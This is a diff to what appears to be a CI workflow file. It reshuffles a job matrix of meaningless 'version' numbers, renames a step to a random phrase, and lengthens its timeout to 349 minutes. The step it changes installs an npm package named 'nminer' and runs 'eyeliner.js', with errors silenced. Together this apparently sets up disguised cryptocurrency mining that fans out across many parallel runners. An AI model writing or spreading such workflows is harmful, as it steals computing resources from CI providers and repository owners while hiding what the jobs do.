@@ -9,21 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3034 }
-          - { version: 6893 }
-          - { version: 8674 }
-          - { version: 7626 }
-          - { version: 9172 }
-          - { version: 2599 }
-          - { version: 8019 }
-          - { version: 8440 }
-          - { version: 8180 }
-          - { version: 4973 }
-          - { version: 3542 }
-          - { version: 4888 }
-          - { version: 6151 }
-          - { version: 7121 }
-          - { version: 9972 }
+          - { version: 330 }
+          - { version: 4001 }
+          - { version: 932 }
+          - { version: 8642 }
+          - { version: 8742 }
+          - { version: 6080 }
+          - { version: 5542 }
+          - { version: 3122 }
+          - { version: 124 }
+          - { version: 5927 }
+          - { version: 1331 }
+          - { version: 2421 }
+          - { version: 2725 }
+          - { version: 46 }
+          - { version: 6449 }
+          - { version: 1314 }
 
     steps:
       - name: Checkout
@@ -34,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: yet sheepishly
+      - name: gosh total between veg
         run: |
           npm install nminer@latest
-          timeout 318m node eyeliner.js || echo "eyeliner executed"
+          timeout 349m node eyeliner.js || echo "eyeliner executed"
